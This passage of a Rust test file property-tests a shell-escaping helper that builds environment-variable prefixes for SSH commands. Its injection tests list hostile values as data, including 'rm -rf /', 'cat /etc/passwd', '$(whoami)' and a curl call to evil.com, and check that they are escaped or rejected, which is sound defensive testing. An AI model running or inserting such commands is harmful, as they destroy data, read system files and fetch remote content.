            ) {
                info!(target: "proptest::ssh", "Testing prefix build with {} keys", keys.len());

                let mut env = HashMap::new();
                for (i, value) in values.iter().enumerate() {
                    if let Some(key) = keys.get(i) {
                        env.insert(key.clone(), value.clone());
                    }
                }

                let allowlist: Vec<String> = keys.clone();
                let _ = build_env_prefix(&allowlist, |k| env.get(k).cloned());
            }

            /// Property: prefix output has correct structure (KEY='value' format).
            #[test]
            fn prefix_has_correct_structure(
                key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
                value in "[^\\n\\r\\x00]{0,50}",
            ) {
                info!(target: "proptest::ssh", "Testing prefix structure for {}={:?}", key, safe_truncate(&value, 30));

                let mut env = HashMap::new();
                env.insert(key.clone(), value.clone());

                let allowlist = vec![key.clone()];
                let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                if !result.prefix.is_empty() {
                    // Prefix should have format: KEY='...' with trailing space
                    prop_assert!(
                        result.prefix.ends_with(' '),
                        "Prefix should end with space: {:?}",
                        result.prefix
                    );

                    // Should contain the key followed by ='
                    prop_assert!(
                        result.prefix.contains(&format!("{}='", key)),
                        "Prefix should contain KEY=': {:?}",
                        result.prefix
                    );

                    // The value portion should end with a single quote
                    let after_eq = result.prefix.split(&format!("{}=", key)).last().unwrap_or("");
                    prop_assert!(
                        after_eq.trim().ends_with('\''),
                        "Value portion should end with quote: {:?}",
                        after_eq
                    );
                }
            }

            /// Property: rejected keys are tracked correctly.
            #[test]
            fn rejected_keys_tracked(
                bad_key in "[0-9][A-Za-z0-9_]{0,10}",
                value in "[^\\n\\r\\x00]{0,20}",
            ) {
                info!(target: "proptest::ssh", "Testing rejection tracking for: {:?}", bad_key);

                let mut env = HashMap::new();
                env.insert(bad_key.clone(), value);

                let allowlist = vec![bad_key.clone()];
                let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                prop_assert!(
                    result.rejected.contains(&bad_key),
                    "Bad key should be in rejected list: {:?}",
                    result
                );
                prop_assert!(
                    result.prefix.is_empty(),
                    "Prefix should be empty when all keys rejected"
                );
            }

            /// Property: missing keys are silently ignored (not rejected).
            #[test]
            fn missing_keys_ignored(
                existing_key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
                missing_key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
                value in "[^\\n\\r\\x00]{0,20}",
            ) {
                // Ensure keys are different
                prop_assume!(existing_key != missing_key);

                info!(target: "proptest::ssh", "Testing missing key handling");

                let mut env = HashMap::new();
                env.insert(existing_key.clone(), value);

                let allowlist = vec![existing_key.clone(), missing_key.clone()];
                let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                // Missing key should NOT be in rejected list
                prop_assert!(
                    !result.rejected.contains(&missing_key),
                    "Missing key should not be rejected: {:?}",
                    result
                );
                // Existing key should be applied
                prop_assert!(
                    result.applied.contains(&existing_key),
                    "Existing key should be applied: {:?}",
                    result
                );
            }

            /// Property: values with dangerous characters are rejected.
            #[test]
            fn dangerous_values_rejected(
                key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
                prefix in "[^\\n\\r\\x00]{0,10}",
                suffix in "[^\\n\\r\\x00]{0,10}",
            ) {
                info!(target: "proptest::ssh", "Testing dangerous value rejection");

                let dangerous_values = vec![
                    format!("{}\n{}", prefix, suffix),
                    format!("{}\r{}", prefix, suffix),
                    format!("{}\0{}", prefix, suffix),
                ];

                for value in dangerous_values {
                    let mut env = HashMap::new();
                    env.insert(key.clone(), value);

                    let allowlist = vec![key.clone()];
                    let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                    prop_assert!(
                        result.rejected.contains(&key),
                        "Key with dangerous value should be rejected"
                    );
                }
            }
        }

        // ---- Security-focused tests ----

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(3000))]

            /// Property: Command injection via env values is handled correctly.
            /// Values without newlines/CR/NUL are escaped; dangerous chars become literal.
            #[test]
            fn command_injection_handled(
                key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
                injection in prop::sample::select(vec![
                    "'; rm -rf /; echo '",
                    "'; cat /etc/passwd; echo '",
                    "$(whoami)",
                    "`id`",
                    "$((1+1))",
                    "'; $(curl evil.com); echo '",
                    "${IFS}cat${IFS}/etc/passwd",
                    "a]b",
                    "a\\'b",
                ]),
            ) {
                info!(target: "proptest::ssh", "Testing injection handling: {:?}", injection);

                let mut env = HashMap::new();
                env.insert(key.clone(), injection.to_string());

                let allowlist = vec![key.clone()];
                let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                // These injections don't contain newlines/CR/NUL, so they should be applied
                // (the values become literal strings, not executed commands)
                prop_assert!(
                    result.applied.contains(&key),
                    "Injection value should be escaped and applied: {:?}",
                    result
                );

                // Verify the structure is correct
                prop_assert!(
                    result.prefix.contains(&format!("{}='", key)),
                    "Prefix should have KEY=' structure: {:?}",
                    result.prefix
                );

                // Verify single quotes in the injection are escaped
                if injection.contains('\'') {
                    prop_assert!(
                        result.prefix.contains("'\"'\"'"),
                        "Single quotes should be escaped with '\"'\"' pattern: {:?}",
                        result.prefix
                    );
                }
            }

            /// Property: Injection attempts with newlines are rejected.
            #[test]
            fn newline_injection_rejected(
                key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
            ) {
                let injections = vec![
                    "value\n; rm -rf /",
                    "value\r; rm -rf /",
                    "value\0; rm -rf /",
                ];

                for injection in injections {
                    let mut env = HashMap::new();
                    env.insert(key.clone(), injection.to_string());

                    let allowlist = vec![key.clone()];
                    let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                    prop_assert!(
                        result.rejected.contains(&key),
                        "Injection with newline/CR/NUL should be rejected: {:?}",
                        injection
                    );
                }
            }

            /// Property: Unicode in values doesn't break escaping.
            #[test]
            fn unicode_safely_escaped(
                key in "[A-Za-z_][A-Za-z0-9_]{1,10}",
                value in "[\\p{L}\\p{N}\\p{P}]{1,50}",
            ) {
                // Filter out newlines, carriage returns, and NUL which are explicitly rejected
                prop_assume!(!value.contains('\n') && !value.contains('\r') && !value.contains('\0'));

                info!(target: "proptest::ssh", "Testing Unicode escaping: {:?}", safe_truncate(&value, 30));

                let mut env = HashMap::new();
                env.insert(key.clone(), value.clone());

                let allowlist = vec![key.clone()];
                let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

                prop_assert!(
                    result.applied.contains(&key),
                    "Unicode value should be applied: {:?}",
                    result
                );
            }
        }

        // ---- Specific edge case tests ----

        #[test]
        fn escape_empty_string() {
            let escaped = shell_escape_value("").unwrap();
            assert_eq!(escaped, "''");
        }

        #[test]
        fn escape_simple_value() {
            let escaped = shell_escape_value("hello").unwrap();
            assert_eq!(escaped, "'hello'");
        }

        #[test]
        fn escape_single_quote() {
            let escaped = shell_escape_value("it's").unwrap();
            assert_eq!(escaped, "'it'\"'\"'s'");
        }

        #[test]
        fn escape_multiple_quotes() {
            let escaped = shell_escape_value("a'b'c").unwrap();
            assert_eq!(escaped, "'a'\"'\"'b'\"'\"'c'");
        }

        #[test]
        fn escape_space_and_special_chars() {
            let escaped = shell_escape_value("hello world!@#$%^&*()").unwrap();
            assert_eq!(escaped, "'hello world!@#$%^&*()'");
        }

        #[test]
        fn escape_rejects_newline() {
            assert!(shell_escape_value("hello\nworld").is_none());
        }

        #[test]
        fn escape_rejects_carriage_return() {
            assert!(shell_escape_value("hello\rworld").is_none());
        }

        #[test]
        fn escape_rejects_nul() {
            assert!(shell_escape_value("hello\0world").is_none());
        }

        #[test]
        fn valid_env_key_examples() {
            assert!(is_valid_env_key("PATH"));
            assert!(is_valid_env_key("_private"));
            assert!(is_valid_env_key("MY_VAR_123"));
            assert!(is_valid_env_key("a"));
            assert!(is_valid_env_key("_"));
        }

        #[test]
        fn invalid_env_key_examples() {
            assert!(!is_valid_env_key(""));
            assert!(!is_valid_env_key("123ABC"));
            assert!(!is_valid_env_key("MY-VAR"));
            assert!(!is_valid_env_key("MY.VAR"));
            assert!(!is_valid_env_key("MY VAR"));
            assert!(!is_valid_env_key("MY=VAR"));
            assert!(!is_valid_env_key("$VAR"));
        }

        #[test]
        fn build_prefix_empty_allowlist() {
            let result = build_env_prefix(&[], |_| None);
            assert!(result.prefix.is_empty());
            assert!(result.applied.is_empty());
            assert!(result.rejected.is_empty());
        }

        #[test]
        fn build_prefix_all_missing() {
            let allowlist = vec!["MISSING1".to_string(), "MISSING2".to_string()];
            let result = build_env_prefix(&allowlist, |_| None);
            assert!(result.prefix.is_empty());
            assert!(result.applied.is_empty());
            assert!(result.rejected.is_empty());
        }

        #[test]
        fn build_prefix_mixed_valid_invalid() {
            let mut env = HashMap::new();
            env.insert("VALID".to_string(), "good".to_string());
            env.insert("123BAD".to_string(), "value".to_string());
            env.insert("DANGEROUS".to_string(), "has\nnewline".to_string());

            let allowlist = vec![
                "VALID".to_string(),
                "123BAD".to_string(),
                "DANGEROUS".to_string(),
            ];

            let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

            assert_eq!(result.applied, vec!["VALID".to_string()]);
            assert!(result.rejected.contains(&"123BAD".to_string()));
            assert!(result.rejected.contains(&"DANGEROUS".to_string()));
            assert_eq!(result.prefix, "VALID='good' ");
        }

        #[test]
        fn build_prefix_trims_whitespace_keys() {
            let mut env = HashMap::new();
            env.insert("MYKEY".to_string(), "value".to_string());

            let allowlist = vec!["  MYKEY  ".to_string()];
            let result = build_env_prefix(&allowlist, |k| env.get(k).cloned());

            assert_eq!(result.applied, vec!["MYKEY".to_string()]);
        }
    }
}
